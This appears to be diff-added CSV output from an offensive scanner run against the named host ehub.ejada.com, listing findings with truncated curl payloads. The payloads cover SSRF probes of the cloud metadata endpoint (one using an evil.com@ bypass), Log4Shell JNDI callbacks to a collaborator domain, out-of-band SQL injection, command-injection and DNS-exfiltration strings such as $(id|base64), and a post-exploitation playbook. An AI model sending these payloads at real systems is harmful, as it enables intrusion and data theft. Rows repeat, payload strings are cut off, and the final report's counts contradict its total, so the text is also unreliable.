+ehub.ejada.com,SSRF-META-PROBE,Cloud metadata SSRF payloads generated (manual verification required),INFO,0.0,CWE-918,SSRF,SSRF parameters probed for cloud metadata leakage. No confirmed hit in automated scan — manual verif,"curl -sk 'https://ehub.ejada.com/?url=http://169.254.169.254/latest/meta-data/'
+"
+ehub.ejada.com,SSL-PIN-HINTS,SSL certificate fingerprints (for pinning bypass research),INFO,0.0,CWE-295,TLS,"CN=? | Issuer=? | Expires=?
+SHA-256: b90d82084a32ffb657ef17183c3fa37b34b2b9126a2daf16fa42b7a4e292f43","# Add to Frida/objection pinning bypass:
+# openssl s_client -connect ehub.ejada."
+ehub.ejada.com,LOG4SHELL-OOB-POC,Log4Shell OOB PoC generated — requires Burp Collaborator / interactsh,INFO,0.0,CWE-917,RCE,JNDI payloads were sent in 5 common headers. No server-side reflection detected passively. Use Burp ,"curl -sk https://ehub.ejada.com/ -H 'User-Agent: ${jndi:ldap://COLLAB/0}'
+curl -"
+ehub.ejada.com,SSRF-BYPASS-POC,SSRF URL parser bypass payloads generated — manual verification required,INFO,0.0,CWE-918,SSRF,11 SSRF blocklist bypass variants generated for manual testing with Burp Collaborator.,curl -sk 'https://ehub.ejada.com//?url=http://evil.com@169.254.169.254/latest/me
+ehub.ejada.com,SQLI-OOB-DNS,OOB SQL injection DNS payloads generated (MySQL/MSSQL/Oracle/PostgreSQL),INFO,0.0,CWE-89,Injection,DNS-based out-of-band SQLi payloads generated for all four major databases. Replace YOUR_COLLABORATO,"# MySQL:
+curl -sk 'https://ehub.ejada.com/api?id=' AND LOAD_FILE(CONCAT('\\\\',v"
+ehub.ejada.com,RCE-VRF-001,RCE Verification — OOB DNS Callback Payloads Generated,INFO,0.0,CWE-78,RCE,Generated 6 OOB DNS-callback RCE verification payloads for ehub.ejada.com. Replace YOUR_OOB_DOMAIN w,"# Inject into confirmed injection point:
+curl -sk 'https://ehub.ejada.com/api/cm"
+ehub.ejada.com,POST-EXPLOIT-MAP-001,Post-Exploitation Path Map — Authorized Testing Playbook,INFO,0.0,CWE-693,Post-Exploitation Analysis,Post-exploitation paths identified based on confirmed findings. For authorized penetration testing o,# Execute only within authorized scope with written permission
+ehub.ejada.com,LOG4SHELL2-OOB-PAYLOADS,Log4Shell Follow-On — All OOB Probe Payloads Generated,INFO,0.0,CWE-917,Log4Shell / Java RCE,Generated 10 Log4Shell bypass payloads for 15 injection headers. Replace YOUR_OOB_DOMAIN with intera,curl -sk 'https://ehub.ejada.com/' -H 'X-Api-Version: ${jndi:ldap://basic.ehub.e
+ehub.ejada.com,DNS-EXFIL-CAPACITY-001,DNS Exfiltration — Channel Analysis & Payload Library,INFO,0.0,CWE-200,DNS Exfiltration,DNS exfiltration channel capacity: ~189 chars/query via 3-label subdomain. Generated 6 OOB DNS exfil,"# DNS exfil via curl:
+curl -sk 'https://ehub.ejada.com/?host=$(id|base64).ehub.e"
+ehub.ejada.com,LOG4SHELL2-OOB-PAYLOADS,Log4Shell Follow-On — All OOB Probe Payloads Generated,INFO,0.0,CWE-917,Log4Shell / Java RCE,Generated 10 Log4Shell bypass payloads for 15 injection headers. Replace YOUR_OOB_DOMAIN with intera,curl -sk 'https://ehub.ejada.com/' -H 'X-Api-Version: ${jndi:ldap://basic.ehub.e
+ehub.ejada.com,DNS-EXFIL-CAPACITY-001,DNS Exfiltration — Channel Analysis & Payload Library,INFO,0.0,CWE-200,DNS Exfiltration,DNS exfiltration channel capacity: ~189 chars/query via 3-label subdomain. Generated 6 OOB DNS exfil,"# DNS exfil via curl:
+curl -sk 'https://ehub.ejada.com/?host=$(id|base64).ehub.e"
+ehub.ejada.com,LOG4SHELL2-OOB-PAYLOADS,Log4Shell Follow-On — All OOB Probe Payloads Generated,INFO,0.0,CWE-917,Log4Shell / Java RCE,Generated 10 Log4Shell bypass payloads for 15 injection headers. Replace YOUR_OOB_DOMAIN with intera,curl -sk 'https://ehub.ejada.com/' -H 'X-Api-Version: ${jndi:ldap://basic.ehub.e
+ehub.ejada.com,SSRF-ADV-OOB-URL,SSRF Advanced OOB Payload — ?url,INFO,0.0,CWE-918,SSRF,OOB SSRF test payload for parameter 'url'. Replace OOB domain.,curl -sk 'https://ehub.ejada.com/?url=http%3A//url.ehub.ejada.com.YOUR_OOB_DOMAI
+ehub.ejada.com,SSRF-ADV-OOB-URL,SSRF Advanced OOB Payload — ?url,INFO,0.0,CWE-918,SSRF,OOB SSRF test payload for parameter 'url'. Replace OOB domain.,curl -sk 'https://ehub.ejada.com/?url=http%3A//url.ehub.ejada.com.YOUR_OOB_DOMAI
+ehub.ejada.com,SSRF-ADV-OOB-URL,SSRF Advanced OOB Payload — ?url,INFO,0.0,CWE-918,SSRF,OOB SSRF test payload for parameter 'url'. Replace OOB domain.,curl -sk 'https://ehub.ejada.com/?url=http%3A//url.ehub.ejada.com.YOUR_OOB_DOMAI
+ehub.ejada.com,SSRF-ADV-OOB-URL,SSRF Advanced OOB Payload — ?url,INFO,0.0,CWE-918,SSRF,OOB SSRF test payload for parameter 'url'. Replace OOB domain.,curl -sk 'https://ehub.ejada.com/?url=http%3A//url.ehub.ejada.com.YOUR_OOB_DOMAI
+ehub.ejada.com,RECON-SUBDOMAIN-BRUTE-001,Subdomain Brute — 1 new subdomains discovered,INFO,0.0,CWE-200,Reconnaissance,DNS brute-force discovered 1 additional subdomains for ejada.com. Each represents additional attack ,curl -sk 'https://vpn.ejada.com/'
+ehub.ejada.com,FINAL-CHAIN-REPORT-001,Final Attack Chain Report — 21C / 33H / 41M,INFO,0.0,CWE-693,Report,"═══ APEX_HUNTER FINAL REPORT — ehub.ejada.com ═══
+Scan date    : 2026-06-01 01:47
+Total findings: 11",# See individual finding PoC commands in JSON/HTML report
